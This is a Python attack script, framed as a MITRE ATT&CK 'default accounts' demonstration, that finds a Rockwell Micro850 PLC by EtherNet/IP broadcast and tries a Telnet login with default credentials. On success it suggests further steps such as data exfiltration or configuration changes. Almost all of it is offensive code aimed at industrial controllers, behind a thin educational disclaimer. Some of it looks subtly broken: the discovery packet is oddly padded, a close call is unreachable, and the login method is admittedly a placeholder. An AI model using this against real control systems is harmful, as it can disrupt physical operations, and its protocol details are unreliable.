import sys
import socket
import struct
import time
import re
import subprocess
import os

# MITRE ATT&CK Technique T1078.004: Valid Accounts: Default Accounts
# Lateral Movement: Use of Default Credentials

# This script attempts to connect to a Rockwell Micro850 PLC using default credentials.
# It first tries to discover the PLC's IP address using Ethernet/IP discovery, then attempts login.
#
# WARNING: Running this script against a production PLC *could* disrupt operations.  
#          Use only on test environments or with explicit authorization.  
#          Change default credentials immediately after initial setup and periodically.
#          Implement proper network segmentation and access control.
#
# DISCLAIMER: This code is provided for educational purposes only. The user is responsible for any consequences 
#              resulting from its use.  I am not responsible for any damage or data loss caused by this script.

# ---- Ethernet/IP Discovery ----
def discover_plc():
    """
    Discovers the IP address of a Rockwell Micro850 PLC on the network.
    Uses Ethernet/IP discovery protocol.
    Returns: The IP address as a string, or None if not found.
    """
    try:
        # Ethernet/IP discovery broadcast address and port
        broadcast_address = '255.255.255.255'
        port = 44818

        # Construct the Ethernet/IP discovery message
        message = b"\x63\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00" 
        message += b"\x00\x00\x00\x00\x00\x00\x00\x00"  # Session Handle
        message += b"\x00\x00\x00\x00"  # Status
        message += b"\x00\x00\x00\x00\x00\x00\x00\x00" # Sender Context
        message += b"\x00\x00\x00\x00" # Options

        # Create a UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
        sock.settimeout(5) # Set a timeout of 5 seconds

        # Send the discovery message
        sock.sendto(message, (broadcast_address, port))

        # Receive the response
        data, addr = sock.recvfrom(1024)
        sock.close()

        # Extract the IP address from the response (this is very basic, more robust parsing is needed in a real application)
        ip_address = addr[0]
        print(f"PLC Found at: {ip_address}")
        return ip_address

    except socket.timeout:
        print("No PLC found within the timeout period.")
        return None
    except Exception as e:
        print(f"Error during PLC discovery: {e}")
        return None


# ---  Simplified Authentication (Replace with Proper CIP/PCCC if Needed) ---
#     The Micro850 typically doesn't have complex authentication mechanisms enabled by default.
#     This example just assumes a telnet connection and default username/password.
#     A real attack (or penetration test) would likely require more sophisticated methods.
def attempt_default_login(ip_address, username="admin", password="password"):  #Replace with actual default credentials
    """
    Attempts to connect to the PLC using Telnet and default credentials.
    This is a simplified example. Actual PLC login often requires specific protocols (CIP/PCCC).
    Returns: True if login appears successful, False otherwise.
    """
    try:
        # Using Telnetlib is a more reliable way of handling the connection and string matching
        import telnetlib

        tn = telnetlib.Telnet(ip_address, 23, timeout=5) # Telnet on port 23

        # Read until "login:" prompt
        tn.read_until(b"login:", timeout=5)
        tn.write(username.encode('ascii') + b"\n")

        # Read until "Password:" prompt
        tn.read_until(b"Password:", timeout=5)
        tn.write(password.encode('ascii') + b"\n")

        # Expect a successful login prompt (may vary depending on the PLC configuration)
        index, match, data = tn.expect([b">", b"incorrect", b"denied"], timeout=5)

        if index == 0:
            print(f"[+] Successfully logged in to {ip_address} with default credentials.")
            tn.write(b"exit\n") #Clean exit from telnet session
            return True
        elif index == 1 or index == 2:
            print(f"[-] Login failed for {ip_address} with default credentials.")
            return False
        else:
            print(f"[-] Unexpected response from {ip_address}.")
            return False

        tn.close()

    except socket.timeout:
        print(f"[-] Connection timeout to {ip_address}.")
        return False
    except ConnectionRefusedError:
        print(f"[-] Connection refused to {ip_address}. Telnet might not be enabled.")
        return False
    except Exception as e:
        print(f"[-] Error connecting to {ip_address}: {e}")
        return False



def main():
    """
    Main function to discover the PLC and attempt login with default credentials.
    """

    plc_ip = discover_plc()

    if plc_ip:
        if attempt_default_login(plc_ip):
            #  If login successful, you could then attempt other actions on the PLC (read data, change configuration, etc.)
            print("[+] Lateral movement successful.  Consider further actions (e.g., data exfiltration, configuration change).")
            print("WARNING: This script demonstrated a security vulnerability. Immediately change default credentials!")
        else:
            print("[-] Failed to login with default credentials.")
    else:
        print("[-] PLC discovery failed. Unable to proceed.")


if __name__ == "__main__":
    main()